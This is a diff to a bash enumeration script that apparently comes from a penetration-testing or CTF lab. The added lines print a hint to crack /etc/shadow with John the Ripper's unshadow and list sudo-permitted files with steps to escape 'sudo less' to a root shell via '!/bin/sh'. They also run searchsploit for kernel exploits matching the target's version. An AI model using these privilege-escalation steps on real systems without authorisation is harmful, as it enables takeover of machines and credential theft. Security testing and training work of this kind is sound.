@@ -402,11 +402,64 @@ if [ $? -eq 0 ]; then
 	THIS IS YOUR LUCKY DAY!!!
 	THE GOD'S OF ENUMERATION HAVE DEEMED FIT 
 	TO BESTOW THE KEY OF ROOT UPON YOU!!!
+
+      BY USING THE UNSHADOW FEATURE OF JOHN THE RIPPER 
+         ON THE /ETC/PASSWD AND /ETC/SHADOW FILES 
+            YOU NOW PWN THE TARGET MACHINE
+
+
+
 	"
 # negative result
 else
 	printf "
 
 	ENUMERATION DID NOT GRANT YOU A /ETC/SHADOW FILE
+
+
+
+
 	"
 fi
+
+###################################################################################################################
+
+echo '
+###################################################################################################################'
+
+# Privilege escalation via sudo less
+
+SUDOBLE=$(grep 'may run the following commands' -A3 "$Info" | sed -n '1!p')
+
+printf '\n\n\n'
+echo "Privilege escalation description:
+        -sudo less into one of the listed files
+        -go to end of file
+        -type '!/bin/sh'
+        -congratulations you are now root user."
+echo "While ssh'd as User '$USERNAME', The following files will permit privilege escalation:"
+echo "  "$SUDOBLE
+
+printf '\n\n\n'
+echo '###################################################################################################################'
+
+###################################################################################################################
+
+# Kernel Version in searchsploit
+## Note: This may require checking for searchsploit in the beggining ###
+
+KVSE=$(grep 'KERNEL VERSION' -A2 "$Info" | sed -n '1,2!p')
+KVSE=${KVSE:0:4}
+
+echo "
+        THE SEARCHSPLOIT DATABASE HAS THE FOLOWING 
+        VULNERABILITIES LISTED FOR THE KERNEL VER.
+        OF THE TARGET MACHINE:
+
+    "
+searchsploit "LINUX KERNEL " $KVSE
+
+printf '\n\n\n'
+echo '###################################################################################################################'
+
+###################################################################################################################
